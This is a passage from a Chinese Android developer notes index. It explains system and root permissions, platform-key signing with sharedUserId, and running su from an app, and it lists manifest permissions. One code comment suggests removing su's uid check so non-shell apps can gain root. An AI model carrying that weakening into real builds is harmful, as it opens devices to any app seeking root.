Android\u7cfb\u7edf\u6709\u4e00\u4e9bAPI\u53ca\u6743\u9650\u662f\u9700\u8981apk\u5177\u6709\u4e00\u5b9a\u7684\u7b49\u7ea7\u624d\u80fd\u8fd0\u884c\u7684\u3002 \u6bd4\u5982 SystemClock.setCurrentTimeMillis()\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0cWRITE_SECURE_SETTINGS\u6743\u9650\u597d\u50cf\u90fd\u662f\u9700\u8981\u6709system\u7ea7\u7684\u6743\u9650\u624d\u884c\u3002 \u4e5f\u5c31\u662f\u8bf4UserID\u662fsystem. \uff082\uff09Log\u91cc\u6ca1\u6709\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u800c\u662f\u4e00\u4e9b\u5176\u4ed6Exception\u7684\u63d0\u793a,\u8fd9\u4e5f\u6709\u53ef\u80fd\u662f\u6743\u9650\u4e0d\u8db3\u9020\u6210\u7684\u3002 \u6bd4\u5982\uff1a\u6211\u4eec\u5e38\u4f1a\u60f3\u8bfb/\u5199\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6216\u5176\u4ed6\u4e00\u4e9b\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5e38\u4f1a\u62a5java.io.FileNotFoundException\u9519\u8bef\u3002 \u7cfb\u7edf\u8ba4\u4e3a\u6bd4\u8f83\u91cd\u8981\u7684\u6587\u4ef6\u4e00\u822c\u6743\u9650\u8bbe\u7f6e\u7684\u4e5f\u4f1a\u6bd4\u8f83\u4e25\u683c\uff0c\u7279\u522b\u662f\u4e00\u4e9b\u5f88\u91cd\u8981\u7684(\u914d\u7f6e)\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u5982 -r--r----- bluetooth bluetooth 935 2010-07-09 20:21 dbus.conf drwxrwx--x system system 2010-07-07 02:05 data dbus.conf\u597d\u50cf\u662f\u84dd\u7259\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u6743\u9650\u4e0a\u6765\u770b\uff0c\u6839\u672c\u5c31\u4e0d\u53ef\u80fd\u6539\u52a8\uff0c\u975ebluetooth\u7528\u6237\u8fde\u8bfb\u7684\u6743\u5229\u90fd\u6ca1\u6709\u3002 /data\u76ee\u5f55\u4e0b\u5b58\u7684\u662f\u6240\u6709\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bandroid\u662f\u4e0d\u5141\u8bb8\u666e\u901aapk\u8bbf\u95ee/data\u76ee\u5f55\u4e0b\u5185\u5bb9\u7684\uff0c\u901a\u8fc7data\u76ee\u5f55\u7684\u6743\u9650\u8bbe\u7f6e\u53ef\u77e5\uff0c\u5176\u4ed6\u7528\u6237\u6ca1\u6709\u8bfb\u7684\u6743\u9650\u3002 \u6240\u4ee5adb\u666e\u901a\u6743\u9650\u4e0b\u5728data\u76ee\u5f55\u4e0b\u6572ls\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230 opendir failed, Permission denied \u7684\u9519\u8bef\uff0c\u901a\u8fc7\u4ee3\u7801file.listfiles()\u4e5f\u65e0\u6cd5\u83b7\u5f97data\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\u3002 \u4e0a\u9762\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u90fd\u9700\u8981\u63d0\u5347apk\u7684\u6743\u9650\uff0c\u76ee\u524d\u6211\u6240\u77e5\u7684apk\u80fd\u63d0\u5347\u5230\u7684\u6743\u9650\u5c31\u662fsystem\uff08\u5177\u4f53\u65b9\u6cd5\u89c1\uff1a\u5982\u4f55\u4f7fAndroid\u5e94\u7528\u7a0b\u5e8f\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff09,","title":"Android\u6743\u9650\u8bf4\u660e"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-apk-system","text":"\u6700\u8fd1\u5728\u56de\u7b54\u5ba2\u6237\u7684\u95ee\u9898\u65f6\uff0c\u63d0\u5230\u600e\u4e48\u5c06apk \u5347\u7ea7\u5230root\u6743\u9650\u3002 1.\u4e00\u822c\u6743\u9650\u7684\u6dfb\u52a0 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5b9aapk\u7684\u6743\u9650\uff0c\u53ef\u5728AndroidManifest.xml\u4e2d\u6dfb\u52a0android:sharedUserId=\"android.uid.xxx> \u4f8b\u5982\uff1a \u7ed9apk\u6dfb\u52a0system\u6743\u9650 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" ... ... android:sharedUserId=\"android.uid.system\"> \u540c\u65f6\u8fd8\u9700\u8981\u5728\u5bf9\u5e94\u7684Android.mk\u4e2d\u6dfb\u52a0LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u9879\u3002\u5373\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ea\u80fd\u4f7fapk\u7684\u6743\u9650\u5347\u7ea7\u5230system\u7ea7\u522b\uff0c\u7cfb\u7edf\u4e2d\u8981\u6c42root\u6743\u9650\u624d\u80fd\u8bbf\u95ee\u7684\u6587\u4ef6\uff0capk\u8fd8\u662f\u4e0d\u80fd\u8bbf\u95ee\u3002 \u6bd4\u5982\u5728android \u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u628aeclipse\u7f16\u51fa\u6765\u7684apk\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\u6587\u4ef6\u7b7e\u540d 1. \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211ndroid\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build/target/product/security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build/tools/signapk\"\u4e0b\uff0c\u7f16\u8bd1\u540e\u5728out/host/linux-x86/framework\u4e0b\uff0c\u7528\u6cd5\u4e3ajava -jar signapk.jar platform.x509.pem platform.pk8 input.apk output.apk\"\u3002 \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002","title":"\u600e\u6837\u4f7fandroid apk  \u83b7\u53d6system\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-apk-root","text":"\u4e00\u822clinux \u83b7\u53d6root\u6743\u9650\u662f\u901a\u8fc7\u6267\u884csu\u547d\u4ee4\uff0c\u90a3\u80fd\u4e0d\u80fd\u5728apk\u7a0b\u5e8f\u4e2d\u4e5f\u540c\u6837\u6267\u884c\u4e00\u4e0b\u8be5\u547d\u4ee4\u5462\uff0c\u6211\u4eec\u77e5\u9053\u5728linux\u7f16\u7a0b\u4e2d\uff0c\u6709exec\u51fd\u6570\u65cf\uff1a \u3000\u3000int execl(c[ON](http://www.dzsc.com/data/iccompany/detail12.html)st char *path, const char *arg, ...); \u3000\u3000int execlp(const char *file, const char *arg, ...); \u3000\u3000int execle(const char *path, const char *arg, ..., char *const envp[]); \u3000\u3000int execv(const char *path, char *const argv[]); \u3000\u3000int execvp(const char *file, char *const argv[]); \u3000\u3000int execve(const char *path, char *const argv[], char *const envp[]); \u5728java\u4e2d\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff Runtime.getRuntime().exec([String](http://www.coderanch.com/t/410859/java/java/String-StringBuffer-StringBuilder-Performance \"String vs. StringBuilder/StringBuffer\") command) \u8bbf\u95ee\u5e95\u5c42Linux\u4e0b\u7684\u7a0b\u5e8f\u6216\u811a\u672c\uff0c\u8fd9\u6837\u5c31\u80fd\u6267\u884csu\u547d\u4ee4\uff0c\u4f7fapk\u5177\u6709root\u6743\u9650\uff0c\u80fd\u591f\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u9700\u8981root\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u7a0b\u5e8f\u6216\u811a\u672c\u4e86\uff0c\u5177\u4f53\u4f8b\u5b50\uff1a package com.visit.dialoglog; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.IOException; import android.app.Activity; import android.os.Bundle; import android.util.Log; public class VisitRootfileActivity extends Activity { private static final String TAG = \"VisitRootfileActivity\"; Process process = null; Process process1 = null; DataOutputStream os = null; DataInputStream is = null; /** Called when the activity is first created. */ @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); try { process = Runtime.getRuntime().exec(\"/system/xbin/su\"); /*\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u4fee\u6539su \u7684\u6e90\u4ee3\u7801 \uff08\u6ce8\u6389 if (myuid != AID_ROOT && myuid != AID_SHELL) {*/ os = new DataOutputStream(process.getOutputStream()); is = new DataInputStream(process.getInputStream()); os.writeBytes(\"/system/bin/ls\" + \" \\n\"); //\u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u5177\u6709root \u6743\u9650\u7684\u7a0b\u5e8f\u4e86 os.writeBytes(\" exit \\n\"); os.flush(); process.waitFor(); } catch (Exception e) { Log.e(TAG, \"Unexpected error - Here is what I know:\" + e.getMessage()); } finally { try { if (os != null) { os.close(); } if (is != null) { is.close(); } process.destroy(); } catch (Exception e) { } }// get the root privileges } }","title":"\u600e\u6837\u4f7fandroid apk  \u83b7\u53d6root\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#apkandroidmanifestxml","text":"android.permission.ACCESS_CHECKIN_PROPERTIES //\u5141\u8bb8\u8bfb\u5199\u8bbf\u95ee\u201dproperties\u201d\u8868\u5728checkin\u6570\u636e\u5e93\u4e2d\uff0c\u6539\u503c\u53ef\u4ee5\u4fee\u6539\u4e0a\u4f20 android.permission.ACCESS_COARSE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95eeCellID\u6216WiFi\u70ed\u70b9\u6765\u83b7\u53d6\u7c97\u7565\u7684\u4f4d\u7f6e android.permission.ACCESS_FINE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u7cbe\u826f\u4f4d\u7f6e(\u5982GPS) android.permission.ACCESS_LOCATION_EXTRA_COMMANDS //\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u989d\u5916\u7684\u4f4d\u7f6e\u63d0\u4f9b\u547d\u4ee4 android.permission.ACCESS_MOCK_LOCATION //\u5141\u8bb8\u7a0b\u5e8f\u521b\u5efa\u6a21\u62df\u4f4d\u7f6e\u63d0\u4f9b\u7528\u4e8e\u6d4b\u8bd5 android.permission.ACCESS_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95ee\u6709\u5173GSM\u7f51\u7edc\u4fe1\u606f android.permission.ACCESS_SURFACE_FLINGER //\u5141\u8bb8\u7a0b\u5e8f\u4f7f\u7528SurfaceFlinger\u5e95\u5c42\u7279\u6027 android.permission.ACCESS_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95eeWi-Fi\u7f51\u7edc\u72b6\u6001\u4fe1\u606f android.permission.ADD_SYSTEM_SERVICE //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u5e03\u7cfb\u7edf\u7ea7\u670d\u52a1 android.permission.BATTERY_STATS //\u5141\u8bb8\u7a0b\u5e8f\u66f4\u65b0\u624b\u673a\u7535\u6c60\u7edf\u8ba1\u4fe1\u606f android.permission.BLUETOOTH //\u5141\u8bb8\u7a0b\u5e8f\u8fde\u63a5\u5230\u5df2\u914d\u5bf9\u7684\u84dd\u7259\u8bbe\u5907 android.permission.BLUETOOTH_ADMIN //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u73b0\u548c\u914d\u5bf9\u84dd\u7259\u8bbe\u5907 android.permission.BRICK //\u8bf7\u6c42\u80fd\u591f\u7981\u7528\u8bbe\u5907(\u975e\u5e38\u5371\u9669 android.permission.BROADCAST_PACKAGE_REMOVED //\u5141\u8bb8\u7a0b\u5e8f\u5e7f\u64ad\u4e00\u4e2a\u63d0\u793a\u6d88\u606f\u5728\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5305\u5df2\u7ecf\u79fb\u9664\u540e android.permission.BROADCAST_STICKY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5e7f\u64ad\u5e38\u7528intents android.permission.CALL_PHONE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u521d\u59cb\u5316\u4e00\u4e2a\u7535\u8bdd\u62e8\u53f7\u4e0d\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CALL_PRIVILEGED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u62e8\u6253\u4efb\u4f55\u53f7\u7801\uff0c\u5305\u542b\u7d27\u6025\u53f7\u7801\u65e0\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CAMERA //\u8bf7\u6c42\u8bbf\u95ee\u4f7f\u7528\u7167\u76f8\u8bbe\u5907 android.permission.CHANGE_COMPONENT_ENABLED_STATE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u662f\u5426\u6539\u53d8\u4e00\u4e2a\u7ec4\u4ef6\u6216\u5176\u4ed6\u7684\u542f\u7528\u6216\u7981\u7528 android.permission.CHANGE_CONFIGURATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5f53\u524d\u8bbe\u7f6e\uff0c\u5982\u672c\u5730\u5316 android.permission.CHANGE_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8\u7f51\u7edc\u8fde\u63a5\u72b6\u6001 android.permission.CHANGE_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Wi-Fi\u8fde\u63a5\u72b6\u6001 android.permission.CLEAR_APP_CACHE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u695a\u7f13\u5b58\u4ece\u6240\u6709\u5b89\u88c5\u7684\u7a0b\u5e8f\u5728\u8bbe\u5907\u4e2d android.permission.CLEAR_APP_USER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u9664\u7528\u6237\u8bbe\u7f6e android.permission.CONTROL_LOCATION_UPDATES //\u5141\u8bb8\u542f\u7528\u7981\u6b62\u4f4d\u7f6e\u66f4\u65b0\u63d0\u793a\u4ece\u65e0\u7ebf\u6a21\u5757 android.permission.DELETE_CACHE_FILES //\u5141\u8bb8\u7a0b\u5e8f\u5220\u9664\u7f13\u5b58\u6587\u4ef6 android.permission.DELETE_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5220\u9664\u5305 android.permission.DEVICE_POWER //\u5141\u8bb8\u8bbf\u95ee\u5e95\u5c42\u7535\u6e90\u7ba1\u7406 android.permission.DIAGNOSTIC //\u5141\u8bb8\u7a0b\u5e8fRW\u8bca\u65ad\u8d44\u6e90 android.permission.DISABLE_KEYGUARD //\u5141\u8bb8\u7a0b\u5e8f\u7981\u7528\u952e\u76d8\u9501 android.permission.DUMP //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u72b6\u6001\u6293\u53d6\u4fe1\u606f\u4ece\u7cfb\u7edf\u670d\u52a1 android.permission.EXPAND_STATUS_BAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6269\u5c55\u6536\u7f29\u5728\u72b6\u6001\u680f,android\u5f00\u53d1\u7f51\u63d0\u793a\u5e94\u8be5\u662f\u4e00\u4e2a\u7c7b\u4f3cWindows Mobile\u4e2d\u7684\u6258\u76d8\u7a0b\u5e8f android.permission.FACTORY_TEST //\u4f5c\u4e3a\u4e00\u4e2a\u5de5\u5382\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u8fd0\u884c\u5728root\u7528\u6237 android.permission.FLASHLIGHT //\u8bbf\u95ee\u95ea\u5149\u706f,android\u5f00\u53d1\u7f51\u63d0\u793aHTC Dream\u4e0d\u5305\u542b\u95ea\u5149\u706f android.permission.FORCE_BACK //\u5141\u8bb8\u7a0b\u5e8f\u5f3a\u884c\u4e00\u4e2a\u540e\u9000\u64cd\u4f5c\u662f\u5426\u5728\u9876\u5c42activities android.permission.FOTA_UPDATE //\u6682\u65f6\u4e0d\u4e86\u89e3\u8fd9\u662f\u505a\u4ec0\u4e48\u4f7f\u7528\u7684\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u4e00\u4e2a\u9884\u7559\u6743\u9650. android.permission.GET_ACCOUNTS //\u8bbf\u95ee\u4e00\u4e2a\u5e10\u6237\u5217\u8868\u5728Accounts Service\u4e2d android.permission.GET_PACKAGE_SIZE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4efb\u4f55package\u5360\u7528\u7a7a\u95f4\u5bb9\u91cf android.permission.GET_TASKS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4fe1\u606f\u6709\u5173\u5f53\u524d\u6216\u6700\u8fd1\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u4e00\u4e2a\u7f29\u7565\u7684\u4efb\u52a1\u72b6\u6001\uff0c\u662f\u5426\u6d3b\u52a8\u7b49\u7b49 android.permission.HARDWARE_TEST //\u5141\u8bb8\u8bbf\u95ee\u786c\u4ef6 android.permission.INJECT_EVENTS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u622a\u83b7\u7528\u6237\u4e8b\u4ef6\u5982\u6309\u952e\u3001\u89e6\u6478\u3001\u8f68\u8ff9\u7403\u7b49\u7b49\u5230\u4e00\u4e2a\u65f6\u95f4\u6d41\uff0candroid\u5f00\u53d1\u7f51\u63d0\u9192\u7b97\u662fhook\u6280\u672f\u5427 android.permission.INSTALL_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5b89\u88c5packages android.permission.INTERNAL_SYSTEM_WINDOW //\u5141\u8bb8\u6253\u5f00\u7a97\u53e3\u4f7f\u7528\u7cfb\u7edf\u7528\u6237\u754c\u9762 android.permission.INTERNET //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u7f51\u7edc\u5957\u63a5\u5b57 android.permission.MANAGE_APP_TOKENS //\u5141\u8bb8\u7a0b\u5e8f\u7ba1\u7406(\u521b\u5efa\u3001\u50ac\u540e\u3001 z- order\u9ed8\u8ba4\u5411z\u8f74\u63a8\u79fb)\u7a0b\u5e8f\u5f15\u7528\u5728\u7a97\u53e3\u7ba1\u7406\u5668\u4e2d android.permission.MASTER_CLEAR //\u76ee\u524d\u8fd8\u6ca1\u6709\u660e\u786e\u7684\u89e3\u91ca\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u6e05\u9664\u4e00\u5207\u6570\u636e\uff0c\u7c7b\u4f3c\u786c\u683c\u673a android.permission.MODIFY_AUDIO_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539\u5168\u5c40\u97f3\u9891\u8bbe\u7f6e android.permission.MODIFY_PHONE_STATE //\u5141\u8bb8\u4fee\u6539\u8bdd\u673a\u72b6\u6001\uff0c\u5982\u7535\u6e90\uff0c\u4eba\u673a\u63a5\u53e3\u7b49 android.permission.MOUNT_UNMOUNT_FILESYSTEMS //\u5141\u8bb8\u6302\u8f7d\u548c\u53cd\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u53ef\u79fb\u52a8\u5b58\u50a8 android.permission.PERSISTENT_ACTIVITY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbe\u7f6e\u4ed6\u7684activities\u663e\u793a android.permission.PROCESS_OUTGOING_CALLS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u89c6\u3001\u4fee\u6539\u6709\u5173\u64ad\u51fa\u7535\u8bdd android.permission.READ_CALENDAR //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.READ_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.READ_FRAME_BUFFER //\u5141\u8bb8\u7a0b\u5e8f\u5c4f\u5e55\u6ce2\u6216\u548c\u66f4\u591a\u5e38\u89c4\u7684\u8bbf\u95ee\u5e27\u7f13\u51b2\u6570\u636e android.permission.READ_INPUT_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u5f53\u524d\u6309\u952e\u72b6\u6001 android.permission.READ_LOGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u5e95\u5c42\u7cfb\u7edf\u65e5\u5fd7\u6587\u4ef6 android.permission.READ_OWNER_DATA //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.READ_SMS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u77ed\u4fe1\u606f android.permission.READ_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u8bbe\u7f6e android.permission.READ_SYNC_STATS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u72b6\u6001 android.permission.REBOOT //\u8bf7\u6c42\u80fd\u591f\u91cd\u65b0\u542f\u52a8\u8bbe\u5907 android.permission.RECEIVE_BOOT_COMPLETED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u63a5\u6536\u5230 android.permission.RECEIVE_MMS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230MMS\u5f69\u4fe1,\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u4e00\u4e2a\u5c06\u6536\u5230\u77ed\u4fe1\u606f\uff0c\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_WAP_PUSH //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230WAP PUSH\u4fe1\u606f android.permission.RECORD_AUDIO //\u5141\u8bb8\u7a0b\u5e8f\u5f55\u5236\u97f3\u9891 android.permission.REORDER_TASKS //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Z\u8f74\u6392\u5217\u4efb\u52a1 android.permission.RESTART_PACKAGES //\u5141\u8bb8\u7a0b\u5e8f\u91cd\u65b0\u542f\u52a8\u5176\u4ed6\u7a0b\u5e8f android.permission.SEND_SMS //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u9001SMS\u77ed\u4fe1 android.permission.SET_ACTIVITY_WATCHER //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u6216\u63a7\u5236activities\u5df2\u7ecf\u542f\u52a8\u5168\u5c40\u7cfb\u7edf\u4e2d android.permission.SET_ALWAYS_FINISH //\u5141\u8bb8\u7a0b\u5e8f\u63a7\u5236\u662f\u5426\u6d3b\u52a8\u95f4\u63a5\u5b8c\u6210\u5728\u5904\u4e8e\u540e\u53f0\u65f6 android.permission.SET_ANIMATION_SCALE //\u4fee\u6539\u5168\u5c40\u4fe1\u606f\u6bd4\u4f8b android.permission.SET_DEBUG_APP //\u914d\u7f6e\u4e00\u4e2a\u7a0b\u5e8f\u7528\u4e8e\u8c03\u8bd5 android.permission.SET_ORIENTATION //\u5141\u8bb8\u5e95\u5c42\u8bbf\u95ee\u8bbe\u7f6e\u5c4f\u5e55\u65b9\u5411\u548c\u5b9e\u9645\u65cb\u8f6c android.permission.SET_PREFERRED_APPLICATIONS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5217\u8868\u53c2\u6570PackageManager.addPackageToPreferred()\u548cPackageManager.removePackageFromPreferred()\u65b9\u6cd5 android.permission.SET_PROCESS_FOREGROUND //\u5141\u8bb8\u7a0b\u5e8f\u5f53\u524d\u8fd0\u884c\u7a0b\u5e8f\u5f3a\u884c\u5230\u524d\u53f0 